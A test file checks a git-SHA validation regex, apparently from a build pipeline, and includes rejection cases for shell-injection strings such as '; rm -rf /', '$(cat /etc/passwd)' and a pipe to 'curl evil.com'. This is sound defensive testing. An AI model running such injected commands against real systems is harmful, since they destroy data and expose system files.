import { describe, expect, test } from "bun:test";
import { GIT_SHA_RE } from "$lib/server/pipeline/git.js";

describe("GIT_SHA_RE", () => {
	test("accepts valid 40-char lowercase hex", () => {
		expect(GIT_SHA_RE.test("a".repeat(40))).toBe(true);
	});

	test("accepts valid 40-char uppercase hex", () => {
		expect(GIT_SHA_RE.test("A".repeat(40))).toBe(true);
	});

	test("accepts valid mixed-case hex", () => {
		expect(GIT_SHA_RE.test("aAbBcCdDeEfF00112233445566778899aabbccdd")).toBe(true);
	});

	test("accepts a real-world SHA", () => {
		expect(GIT_SHA_RE.test("e3b0c44298fc1c149afbf4c8996fb92427ae41e4")).toBe(true);
	});

	test("rejects empty string", () => {
		expect(GIT_SHA_RE.test("")).toBe(false);
	});

	test("rejects 39-char hex (too short)", () => {
		expect(GIT_SHA_RE.test("a".repeat(39))).toBe(false);
	});

	test("rejects 41-char hex (too long)", () => {
		expect(GIT_SHA_RE.test("a".repeat(41))).toBe(false);
	});

	test("rejects non-hex characters", () => {
		expect(GIT_SHA_RE.test("g".repeat(40))).toBe(false);
		expect(GIT_SHA_RE.test("z".repeat(40))).toBe(false);
	});

	test("rejects shell injection: semicolon command", () => {
		expect(GIT_SHA_RE.test("; rm -rf /")).toBe(false);
	});

	test("rejects shell injection: backtick substitution", () => {
		expect(GIT_SHA_RE.test("`whoami`")).toBe(false);
	});

	test("rejects shell injection: $() substitution", () => {
		expect(GIT_SHA_RE.test("$(cat /etc/passwd)")).toBe(false);
	});

	test("rejects shell injection: pipe", () => {
		expect(GIT_SHA_RE.test("abc | curl evil.com")).toBe(false);
	});

	test("rejects SHA with embedded spaces", () => {
		expect(GIT_SHA_RE.test(`${"a".repeat(20)} ${"b".repeat(19)}`)).toBe(false);
	});

	test("rejects SHA with newline", () => {
		expect(GIT_SHA_RE.test(`${"a".repeat(20)}\n${"b".repeat(19)}`)).toBe(false);
	});
});
